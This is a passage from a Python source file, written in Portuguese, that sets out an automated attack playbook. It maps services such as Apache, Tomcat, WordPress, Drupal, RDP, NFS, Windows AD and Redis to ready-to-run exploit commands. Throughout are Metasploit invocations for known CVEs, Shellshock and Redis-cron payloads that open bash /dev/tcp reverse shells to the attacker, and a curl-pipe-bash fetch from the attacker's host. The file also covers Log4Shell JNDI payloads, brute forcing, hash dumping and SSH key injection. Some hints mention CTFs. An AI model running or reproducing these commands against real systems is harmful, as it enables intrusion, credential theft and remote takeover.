                "hints": "Também tenta: /etc/shadow, /var/www/html/config.php, wp-config.php"
            },
        ]
    },

    # ── Escalada de Privilégios ──────────────────────────────
    "privesc": {
        "label": "Escalada de Privilégios",
        "color": "bright_red",
        "icon": "⬆️",
        "detect": lambda ports, banners: False,  # activado manualmente
        "attacks": [
            {
                "name": "LinPEAS — enumeração automática",
                "desc": "Ferramenta mais completa para encontrar vectores de escalada",
                "params": [
                    {"key": "lhost",  "label": "Teu IP (servidor HTTP)", "default": ""},
                    {"key": "output", "label": "Ficheiro output",        "default": "linpeas.txt"},
                ],
                "cmd": "curl http://{lhost}/linpeas.sh | bash | tee {output}",
                "followup": {
                    "success": ["privesc_sudo", "privesc_suid", "privesc_cron", "privesc_caps"],
                    "fail":    ["privesc_manual"]
                },
                "hints": "Serve o linpeas.sh com: python3 -m http.server 80 (na tua máquina)"
            },
            {
                "name": "sudo -l — comandos sem password",
                "desc": "Ver o que podes correr como root sem password",
                "params": [],
                "cmd": "sudo -l",
                "followup": {
                    "success": ["privesc_sudo_gtfobins"],
                    "fail":    ["privesc_suid"]
                },
                "hints": "Com resultado: vai a gtfobins.github.io e procura o binário encontrado"
            },
            {
                "name": "GTFObins — explorar sudo",
                "desc": "Escalar com binário encontrado no sudo -l",
                "params": [
                    {"key": "binario", "label": "Binário encontrado (ex: vim, find, python)", "default": ""},
                ],
                "cmd": "echo 'Consulta: https://gtfobins.github.io/gtfobins/{binario}/#sudo'",
                "simple_cmd": "sudo {binario} -c 'id; /bin/bash'",
                "followup": {
                    "success": ["root_shell"],
                    "fail":    ["privesc_suid"]
                },
                "hints": "Exemplos:\n  sudo find . -exec /bin/bash \\;\n  sudo vim -c ':!/bin/bash'\n  sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
            },
            {
                "name": "SUID — binários exploráveis",
                "desc": "Encontrar binários SUID e explorar via GTFObins",
                "params": [],
                "cmd": "find / -perm -4000 2>/dev/null",
                "followup": {
                    "success": ["privesc_suid_exploit"],
                    "fail":    ["privesc_cron"]
                },
                "hints": "Binários SUID comuns exploráveis: find, bash, python, vim, cp, cat, nmap"
            },
            {
                "name": "SUID — explorar binário",
                "desc": "Usar GTFObins para escalar com binário SUID encontrado",
                "params": [
                    {"key": "binario", "label": "Caminho completo do binário SUID", "default": ""},
                ],
                "cmd": "echo 'Ver: https://gtfobins.github.io/#'",
                "simple_cmd": "{binario} -p",
                "followup": {
                    "success": ["root_shell"],
                    "fail":    ["privesc_cron"]
                },
                "hints": "Exemplos:\n  /usr/bin/find . -exec /bin/bash -p \\;\n  /usr/bin/python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"
            },
            {
                "name": "Cron jobs — tarefas agendadas",
                "desc": "Encontrar cron jobs que correm como root com scripts editáveis",
                "params": [],
                "cmd": "cat /etc/crontab; ls -la /etc/cron*; find / -name '*.sh' -writable 2>/dev/null",
                "followup": {
                    "success": ["privesc_cron_exploit"],
                    "fail":    ["privesc_caps"]
                },
                "hints": "Se encontrares script writable que corre como root:\n  echo 'bash -i >& /dev/tcp/TUA_IP/4444 0>&1' >> script.sh"
            },
            {
                "name": "Capabilities — binários especiais",
                "desc": "Procurar binários com capabilities elevadas",
                "params": [],
                "cmd": "getcap -r / 2>/dev/null",
                "followup": {
                    "success": ["privesc_caps_exploit"],
                    "fail":    ["privesc_path"]
                },
                "hints": "Perigoso: cap_setuid+ep, cap_net_raw+ep\nExemplo python3: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
            },
            {
                "name": "PATH Hijacking",
                "desc": "Substituir binário no PATH por script malicioso",
                "params": [
                    {"key": "binario", "label": "Binário a hijack (ex: curl, wget)", "default": ""},
                ],
                "cmd": "echo $PATH; find / -writable -type d 2>/dev/null | head -20",
                "followup": {
                    "success": ["root_shell"],
                    "fail":    ["privesc_kernel"]
                },
                "hints": "Se encontrares directoria writable no PATH:\n  echo '/bin/bash' > /tmp/{binario}\n  chmod +x /tmp/{binario}\n  export PATH=/tmp:$PATH"
            },
            {
                "name": "Kernel exploit",
                "desc": "Explorar vulnerabilidade no kernel Linux",
                "params": [],
                "cmd": "uname -a && cat /etc/os-release",
                "followup": {
                    "success": [],
                    "fail":    []
                },
                "hints": "Com a versão do kernel: searchsploit linux kernel <versao>\nFerramentas: linux-exploit-suggester, linux-smart-enumeration"
            },
            {
                "name": "Password reutilizada — /etc/passwd + shadow",
                "desc": "Tentar ler shadow e crackear hashes",
                "params": [],
                "cmd": "cat /etc/shadow 2>/dev/null || cat /etc/passwd",
                "followup": {
                    "success": ["crack_shadow_hashes"],
                    "fail":    ["privesc_kernel"]
                },
                "hints": "Se conseguires ler /etc/shadow:\n  unshadow /etc/passwd /etc/shadow > hashes.txt\n  john --wordlist=rockyou.txt hashes.txt"
            },
        ]
    },


    # ── Apache / Tomcat ──────────────────────────────────────
    "apache": {
        "label": "Apache / Tomcat",
        "color": "red",
        "icon": "🪶",
        "detect": lambda ports, banners: any(p in ports for p in ["80","443","8080","8443","8009"]) and
            any(s in banners for s in ["apache","tomcat","httpd"]),
        "attacks": [
            {
                "name": "Apache 2.4.49/2.4.50 Path Traversal (CVE-2021-41773)",
                "desc": "RCE/LFI crítico no Apache 2.4.49 e 2.4.50",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                    {"key": "porto", "label": "Porto", "default": "80"},
                ],
                "cmd": "curl http://{alvo}:{porto}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id'",
                "followup": {"success": ["privesc_tree"], "fail": ["apache_struts"]},
                "hints": "Se funcionar tens RCE directo. Tenta depois reverse shell:\ncurl ... --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/TUA_IP/4444 0>&1'"
            },
            {
                "name": "Apache Struts RCE (CVE-2017-5638)",
                "desc": "RCE via Content-Type header malicioso",
                "params": [
                    {"key": "alvo", "label": "URL alvo", "default": "http://{TARGET}"},
                    {"key": "lhost", "label": "Teu IP", "default": ""},
                    {"key": "lport", "label": "Porta", "default": "4444"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/multi/http/struts2_content_type_ognl; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["privesc_tree"], "fail": ["tomcat_manager"]},
                "hints": "Afectou o incidente da Equifax em 2017. Muito comum em CTFs."
            },
            {
                "name": "Tomcat Manager — upload WAR shell",
                "desc": "Fazer deploy de shell via Tomcat Manager (credenciais fracas)",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",       "default": "{TARGET}"},
                    {"key": "porto", "label": "Porto Tomcat",  "default": "8080"},
                    {"key": "user",  "label": "Utilizador",    "default": "tomcat"},
                    {"key": "pass_", "label": "Password",      "default": "tomcat"},
                    {"key": "lhost", "label": "Teu IP",        "default": ""},
                    {"key": "lport", "label": "Porta listener","default": "4444"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {alvo}; set RPORT {porto}; set HttpUsername {user}; set HttpPassword {pass_}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["privesc_tree"], "fail": ["tomcat_brute"]},
                "hints": "Credenciais padrão: tomcat:tomcat, admin:admin, manager:manager\nPrimeiro verifica /manager/html no browser"
            },
            {
                "name": "Tomcat Manager — brute force credenciais",
                "desc": "Força bruta ao painel Tomcat Manager",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",      "default": "{TARGET}"},
                    {"key": "porto", "label": "Porto",         "default": "8080"},
                ],
                "cmd": "msfconsole -q -x 'use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS {alvo}; set RPORT {porto}; run'",
                "followup": {"success": ["tomcat_war_shell"], "fail": ["apache_shellshock"]},
                "hints": "Também podes tentar manualmente: admin:admin, tomcat:s3cret, both:tomcat"
            },
            {
                "name": "Shellshock (CVE-2014-6271)",
                "desc": "RCE via Bash em CGI — Apache/DHCP/SSH",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",  "default": "{TARGET}"},
                    {"key": "porto", "label": "Porto",     "default": "80"},
                    {"key": "lhost", "label": "Teu IP",   "default": ""},
                    {"key": "lport", "label": "Porta",    "default": "4444"},
                ],
                "cmd": "curl -H 'User-Agent: () {{ :; }}; /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' http://{alvo}:{porto}/cgi-bin/test.cgi",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Testa primeiro sem reverse shell:\ncurl -H 'User-Agent: () { :; }; echo; /bin/id' http://{alvo}/cgi-bin/test.cgi\nTambém tenta: /cgi-bin/status, /cgi-bin/admin.cgi"
            },
            {
                "name": "Heartbleed (CVE-2014-0160)",
                "desc": "Leitura de memória via OpenSSL — porta 443",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "msfconsole -q -x 'use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS {alvo}; set VERBOSE true; run'",
                "followup": {"success": [], "fail": []},
                "hints": "Verifica primeiro: nmap -p 443 --script ssl-heartbleed {alvo}\nPode expor chaves privadas, passwords e sessões em memória"
            },
            {
                "name": "Log4Shell (CVE-2021-44228)",
                "desc": "RCE crítico via Log4j — CVSS 10.0",
                "params": [
                    {"key": "alvo",  "label": "URL alvo",    "default": "http://{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",      "default": ""},
                    {"key": "lport", "label": "Porta LDAP",  "default": "1389"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/multi/misc/log4shell_header_injection; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Payload manual: ${jndi:ldap://{lhost}:{lport}/a}\nInjectar em: User-Agent, X-Forwarded-For, username, email"
            },
        ]
    },

    # ── WordPress ─────────────────────────────────────────────
    "wordpress": {
        "label": "WordPress",
        "color": "bright_blue",
        "icon": "📝",
        "detect": lambda ports, banners: any(s in banners for s in ["wordpress","wp-content","wp-login","wp-json","xmlrpc.php","wp-admin"]) or (any(p in ports for p in ["80","443","8080"]) and "wordpress" in banners),
        "attacks": [
            {
                "name": "WPScan — enumeração completa",
                "desc": "Descobrir utilizadores, plugins e temas vulneráveis",
                "params": [
                    {"key": "url",  "label": "URL WordPress", "default": "http://{TARGET}"},
                    {"key": "token","label": "WPScan API token (ENTER para saltar)", "default": ""},
                ],
                "cmd": "wpscan --url {url} -e u,vp,vt,ap --plugins-detection aggressive",
                "followup": {"success": ["wp_brute_users", "wp_exploit_plugin"], "fail": []},
                "hints": "Regista em wpscan.io para API token gratuito — dá mais CVEs"
            },
            {
                "name": "WPScan — brute force admin",
                "desc": "Força bruta ao wp-login.php com users encontrados",
                "params": [
                    {"key": "url",      "label": "URL WordPress",    "default": "http://{TARGET}"},
                    {"key": "users",    "label": "User ou ficheiro", "default": "admin"},
                    {"key": "wordlist", "label": "Wordlist",         "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "wpscan --url {url} -U {users} -P {wordlist} --password-attack wp-login",
                "followup": {"success": ["wp_shell_upload"], "fail": ["wp_xmlrpc"]},
                "hints": "Users comuns WordPress: admin, administrator, wp-admin, editor"
            },
            {
                "name": "WordPress XML-RPC brute force",
                "desc": "Brute force via xmlrpc.php (bypassa rate limiting)",
                "params": [
                    {"key": "url",      "label": "URL WordPress",    "default": "http://{TARGET}"},
                    {"key": "user",     "label": "Utilizador",       "default": "admin"},
                    {"key": "wordlist", "label": "Wordlist",         "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "wpscan --url {url} -U {user} -P {wordlist} --password-attack xmlrpc-multicall",
                "followup": {"success": ["wp_shell_upload"], "fail": ["wp_plugin_exploit"]},
                "hints": "xmlrpc permite múltiplos logins por request — muito mais rápido"
            },
            {
                "name": "WordPress — shell via theme editor",
                "desc": "Após login admin — injectar shell PHP no tema",
                "params": [
                    {"key": "url",   "label": "URL WordPress",  "default": "http://{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",         "default": ""},
                    {"key": "lport", "label": "Porta listener", "default": "4444"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS {url}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Precisa de credenciais admin. Após acesso vai a:\nAppearance > Theme Editor > 404.php e cola a shell"
            },
            {
                "name": "WordPress Plugin — File Manager RCE",
                "desc": "CVE-2020-25213 — plugin File Manager < 6.9",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",         "default": ""},
                    {"key": "lport", "label": "Porta listener", "default": "4444"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/multi/http/wp_file_manager_rce; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["privesc_tree"], "fail": ["wp_brute"]},
                "hints": "Um dos exploits WordPress mais explorados em 2020. Sem autenticação necessária."
            },
        ]
    },

    # ── Drupal ────────────────────────────────────────────────
    "drupal": {
        "label": "Drupal",
        "color": "blue",
        "icon": "💧",
        "detect": lambda ports, banners: "drupal" in banners or "sites/default" in banners,
        "attacks": [
            {
                "name": "Drupalgeddon2 (CVE-2018-7600)",
                "desc": "RCE sem autenticação — Drupal < 7.58 / 8.x < 8.3.9",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",         "default": ""},
                    {"key": "lport", "label": "Porta listener", "default": "4444"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["privesc_tree"], "fail": ["drupal_geddon3"]},
                "hints": "Um dos exploits mais comuns em CTFs. Verifica versão em /CHANGELOG.txt"
            },
            {
                "name": "Drupalgeddon3 (CVE-2018-7602)",
                "desc": "RCE autenticado — Drupal 7.x e 8.x",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",         "default": ""},
                    {"key": "lport", "label": "Porta listener", "default": "4444"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon3; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Precisa de sessão autenticada. Tenta credenciais padrão: admin:admin"
            },
            {
                "name": "Drupal — OpenID brute force",
                "desc": "Força bruta ao painel admin Drupal",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "msfconsole -q -x 'use auxiliary/scanner/http/drupal_login; set RHOSTS {alvo}; set PASS_FILE {wordlist}; run'",
                "followup": {"success": ["drupal_geddon3"], "fail": []},
                "hints": "User padrão: admin. Verifica também /user/login"
            },
        ]
    },

    # ── RDP ───────────────────────────────────────────────────
    "rdp": {
        "label": "RDP (Remote Desktop)",
        "color": "cyan",
        "icon": "🖥️",
        "detect": lambda ports, banners: "3389" in ports or "rdp" in banners or "ms-wbt-server" in banners,
        "attacks": [
            {
                "name": "BlueKeep (CVE-2019-0708)",
                "desc": "RCE sem autenticação RDP — Windows 7/2008",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",         "default": ""},
                    {"key": "lport", "label": "Porta listener", "default": "4444"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["privesc_tree"], "fail": ["rdp_brute"]},
                "hints": "Verifica primeiro: nmap -p 3389 --script rdp-vuln-ms12-020 {alvo}\nPode causar BSOD — usar com cuidado em ambientes reais"
            },
            {
                "name": "DejaBlue (CVE-2019-1181/1182)",
                "desc": "RCE RDP — Windows 8/10/2012/2019",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",         "default": ""},
                    {"key": "lport", "label": "Porta listener", "default": "4444"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_1181_dejablue; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["privesc_tree"], "fail": ["rdp_brute"]},
                "hints": "Versão mais recente que BlueKeep — afecta sistemas mais modernos"
            },
            {
                "name": "RDP Brute force (hydra)",
                "desc": "Força bruta às credenciais RDP",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador", "default": "Administrator"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} rdp://{alvo}",
                "followup": {"success": ["rdp_login"], "fail": []},
                "hints": "Users comuns Windows: Administrator, admin, Guest, user\nTambém tenta: ncrack -p 3389 --user Administrator -P rockyou.txt {alvo}"
            },
            {
                "name": "RDP login com credenciais",
                "desc": "Ligar via RDP com credenciais obtidas",
                "params": [
                    {"key": "alvo", "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user", "label": "Utilizador", "default": "Administrator"},
                ],
                "cmd": "xfreerdp /u:{user} /v:{alvo} /dynamic-resolution +clipboard",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Vai pedir password interactivamente. Adiciona /p:PASSWORD para automatizar."
            },
        ]
    },

    # ── Samba / NFS ───────────────────────────────────────────
    "nfs": {
        "label": "NFS / Rpcbind",
        "color": "magenta",
        "icon": "📂",
        "detect": lambda ports, banners: any(p in ports for p in ["111","2049"]) or "nfs" in banners or "rpcbind" in banners,
        "attacks": [
            {
                "name": "NFS — listar exports",
                "desc": "Ver partilhas NFS disponíveis sem autenticação",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "showmount -e {alvo}",
                "followup": {"success": ["nfs_mount"], "fail": []},
                "hints": "Se mostrar / ou /home — montas e tens acesso ao filesystem"
            },
            {
                "name": "NFS — montar partilha",
                "desc": "Montar directoria NFS localmente",
                "params": [
                    {"key": "alvo",   "label": "IP alvo",             "default": "{TARGET}"},
                    {"key": "share",  "label": "Partilha (ex: /home)","default": "/"},
                    {"key": "mount",  "label": "Ponto de montagem",   "default": "/mnt/nfs"},
                ],
                "cmd": "mkdir -p {mount} && mount -t nfs {alvo}:{share} {mount} && ls -la {mount}",
                "followup": {"success": ["nfs_privesc"], "fail": []},
                "hints": "Se tiveres acesso a /root ou /home/<user>/.ssh podes copiar chaves SSH\ncp {mount}/root/.ssh/id_rsa . && chmod 600 id_rsa && ssh -i id_rsa root@{alvo}"
            },
            {
                "name": "NFS — escalada via UID spoofing",
                "desc": "Criar utilizador local com UID do alvo para acesso root NFS",
                "params": [
                    {"key": "uid",   "label": "UID do utilizador alvo (ex: 1000)", "default": "0"},
                    {"key": "mount", "label": "Ponto de montagem NFS",             "default": "/mnt/nfs"},
                ],
                "cmd": "useradd -u {uid} pwned 2>/dev/null; su pwned -c 'ls -la {mount}'",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "NFS com no_root_squash permite escrever com UID 0:\ncp /bin/bash {mount}/bash && chmod +s {mount}/bash\n{mount}/bash -p"
            },
        ]
    },

    # ── Serviços Windows ──────────────────────────────────────
    "windows": {
        "label": "Windows / Active Directory",
        "color": "bright_blue",
        "icon": "🪟",
        "detect": lambda ports, banners: any(p in ports for p in ["135","139","445","3389","5985","5986","88"]) or
            any(s in banners for s in ["windows","microsoft","iis","active directory","kerberos"]),
        "attacks": [
            {
                "name": "MS08-067 (CVE-2008-4250)",
                "desc": "RCE clássico — Windows XP/2003/Vista/2008",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",         "default": ""},
                    {"key": "lport", "label": "Porta listener", "default": "4444"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["dump_hashes", "privesc_tree"], "fail": ["ms17_010"]},
                "hints": "Clássico do Metasploit. Muito comum em HTB/CTFs com máquinas antigas."
            },
            {
                "name": "PrintNightmare (CVE-2021-34527)",
                "desc": "RCE/LPE via Windows Print Spooler",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",         "default": ""},
                    {"key": "lport", "label": "Porta listener", "default": "4444"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
                "followup": {"success": ["dump_hashes"], "fail": ["windows_winrm"]},
                "hints": "Afecta praticamente todos os Windows com Print Spooler activo"
            },
            {
                "name": "WinRM — acesso remoto PowerShell",
                "desc": "Ligar via WinRM com credenciais (porta 5985)",
                "params": [
                    {"key": "alvo", "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user", "label": "Utilizador", "default": "Administrator"},
                    {"key": "pass_","label": "Password",   "default": ""},
                ],
                "cmd": "evil-winrm -i {alvo} -u {user} -p {pass_}",
                "followup": {"success": ["privesc_tree", "dump_hashes"], "fail": ["windows_ms08"]},
                "hints": "evil-winrm já vem no Kali. Muito útil após obter credenciais Windows."
            },
            {
                "name": "Pass-the-Hash (PTH)",
                "desc": "Autenticar com hash NTLM sem crackear",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",           "default": "{TARGET}"},
                    {"key": "user",  "label": "Utilizador",        "default": "Administrator"},
                    {"key": "hash",  "label": "Hash NTLM (LM:NTLM)","default": ""},
                ],
                "cmd": "pth-winexe -U {user}%{hash} //{alvo} cmd.exe",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Formato hash: aad3b435b51404eeaad3b435b51404ee:HASH_NTLM\nTambém funciona com evil-winrm -H HASH"
            },
            {
                "name": "Kerberoasting",
                "desc": "Extrair tickets Kerberos para crackear offline",
                "params": [
                    {"key": "user",  "label": "Utilizador AD",     "default": ""},
                    {"key": "pass_", "label": "Password",          "default": ""},
                    {"key": "dc",    "label": "IP Domain Controller","default": "{TARGET}"},
                    {"key": "domain","label": "Domínio",           "default": ""},
                ],
                "cmd": "impacket-GetUserSPNs {domain}/{user}:{pass_} -dc-ip {dc} -request -outputfile kerberoast.txt",
                "followup": {"success": ["crack_kerberos"], "fail": []},
                "hints": "Após obter tickets:\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt"
            },
            {
                "name": "Secretsdump — extrair hashes SAM/NTDS",
                "desc": "Dump de hashes locais e de domínio",
                "params": [
                    {"key": "user",  "label": "Utilizador",  "default": "Administrator"},
                    {"key": "pass_", "label": "Password",    "default": ""},
                    {"key": "alvo",  "label": "IP alvo",     "default": "{TARGET}"},
                ],
                "cmd": "impacket-secretsdump {user}:{pass_}@{alvo}",
                "followup": {"success": ["crack_hashes", "pth"], "fail": []},
                "hints": "Com hash: impacket-secretsdump -hashes LM:NT Administrator@{alvo}\nGuarda todos os hashes — crackea depois com hashcat"
            },
        ]
    },

    # ── SNMP ─────────────────────────────────────────────────
    "snmp": {
        "label": "SNMP",
        "color": "yellow",
        "icon": "📡",
        "detect": lambda ports, banners: "161" in ports or "162" in ports or "snmp" in banners,
        "attacks": [
            {
                "name": "SNMP community string brute force",
                "desc": "Descobrir community strings SNMP",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "msfconsole -q -x 'use auxiliary/scanner/snmp/snmp_login; set RHOSTS {alvo}; run'",
                "followup": {"success": ["snmp_enum"], "fail": []},
                "hints": "Community strings comuns: public, private, community, manager, admin"
            },
            {
                "name": "SNMPwalk — enumeração completa",
                "desc": "Extrair toda a informação SNMP disponível",
                "params": [
                    {"key": "alvo",      "label": "IP alvo",          "default": "{TARGET}"},
                    {"key": "community", "label": "Community string", "default": "public"},
                ],
                "cmd": "snmpwalk -v2c -c {community} {alvo} && snmpwalk -v2c -c {community} {alvo} 1.3.6.1.4.1.77.1.2.25",
                "followup": {"success": [], "fail": []},
                "hints": "OID 1.3.6.1.4.1.77.1.2.25 lista utilizadores Windows\nProcura: usernames, processos, software instalado, rotas de rede"
            },
        ]
    },

    # ── Serviços de E-mail ────────────────────────────────────
    "mail": {
        "label": "SMTP / POP3 / IMAP",
        "color": "green",
        "icon": "📧",
        "detect": lambda ports, banners: any(p in ports for p in ["25","110","143","465","587","993","995"]) or
            any(s in banners for s in ["smtp","pop3","imap","sendmail","postfix","dovecot"]),
        "attacks": [
            {
                "name": "SMTP — enumeração de utilizadores",
                "desc": "Descobrir utilizadores via comandos VRFY/EXPN",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_enum; set RHOSTS {alvo}; run'",
                "followup": {"success": ["mail_brute"], "fail": []},
                "hints": "Também manualmente: nc {alvo} 25 → VRFY root → VRFY admin"
            },
            {
                "name": "SMTP Open Relay",
                "desc": "Testar se o servidor aceita relay de e-mail externo",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "nmap -p 25 --script smtp-open-relay {alvo}",
                "followup": {"success": [], "fail": ["mail_brute"]},
                "hints": "Open relay pode ser usado para phishing ou spam — regista como vulnerabilidade"
            },
            {
                "name": "POP3/IMAP brute force",
                "desc": "Força bruta a contas de email",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "proto",    "label": "Protocolo (pop3/imap)", "default": "pop3"},
                    {"key": "user",     "label": "Utilizador", "default": "admin"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} {proto}://{alvo}",
                "followup": {"success": [], "fail": []},
                "hints": "Tenta users encontrados via SMTP enum. Credenciais podem reutilizar-se noutros serviços."
            },
        ]
    },

    # ── Redis ─────────────────────────────────────────────────
    "redis": {
        "label": "Redis",
        "color": "red",
        "icon": "🔴",
        "detect": lambda ports, banners: "6379" in ports or "redis" in banners,
        "attacks": [
            {
                "name": "Redis — acesso sem autenticação",
                "desc": "Ligar ao Redis sem password e enumerar",
                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
                "cmd": "redis-cli -h {alvo} ping && redis-cli -h {alvo} info && redis-cli -h {alvo} keys '*'",
                "followup": {"success": ["redis_rce"], "fail": []},
                "hints": "Se responder PONG — tens acesso total.\nProcura: keys com passwords, tokens, sessões"
            },
            {
                "name": "Redis — RCE via cron job",
                "desc": "Escrever cron job malicioso via Redis para RCE",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",  "default": "{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",   "default": ""},
                    {"key": "lport", "label": "Porta",    "default": "4444"},
                ],
                "cmd": "redis-cli -h {alvo} config set dir /var/spool/cron/ && redis-cli -h {alvo} config set dbfilename root && redis-cli -h {alvo} set payload '\n\n*/1 * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n' && redis-cli -h {alvo} save",
                "followup": {"success": ["privesc_tree"], "fail": ["redis_ssh"]},
                "hints": "Aguarda até 1 minuto pelo cron executar.\nAlternativa: escrever chave SSH authorized_keys"
            },
            {
                "name": "Redis — RCE via SSH authorized_keys",
                "desc": "Injectar chave SSH pública via Redis",
                "params": [
                    {"key": "alvo",   "label": "IP alvo",                    "default": "{TARGET}"},
                    {"key": "pubkey", "label": "Tua chave pública (~/.ssh/id_rsa.pub)", "default": ""},
                ],
                "cmd": "redis-cli -h {alvo} config set dir /root/.ssh/ && redis-cli -h {alvo} config set dbfilename authorized_keys && redis-cli -h {alvo} set pwn '{pubkey}' && redis-cli -h {alvo} save && ssh root@{alvo}",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Gera chave se não tiveres: ssh-keygen -t rsa\nDepois: cat ~/.ssh/id_rsa.pub"
            },
        ]
    },

    # ── MongoDB ───────────────────────────────────────────────
    "mongodb": {
        "label": "MongoDB",
        "color": "green",
        "icon": "🍃",
        "detect": lambda ports, banners: "27017" in ports or "27018" in ports or "mongodb" in banners,
        "attacks": [
            {
                "name": "MongoDB — acesso sem autenticação",
                "desc": "Ligar ao MongoDB sem credenciais",
                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
                "cmd": "mongosh {alvo} --eval 'db.adminCommand({listDatabases:1})'",
                "followup": {"success": ["mongodb_dump"], "fail": []},
                "hints": "Se ligar sem erro — tens acesso.\nAlternativa antiga: mongo {alvo}"
            },
            {
                "name": "MongoDB — dump de bases de dados",
                "desc": "Extrair todas as bases de dados",
                "params": [
                    {"key": "alvo",   "label": "IP alvo",        "default": "{TARGET}"},
                    {"key": "output", "label": "Pasta de output", "default": "./mongo_dump"},
                ],
                "cmd": "mongodump --host {alvo} --out {output} && ls {output}",
                "followup": {"success": [], "fail": []},
                "hints": "Procura DBs: users, admin, accounts, credentials, sessions"
            },
            {
                "name": "MongoDB — nmap enum",
                "desc": "Enumerar MongoDB via scripts NSE",
                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
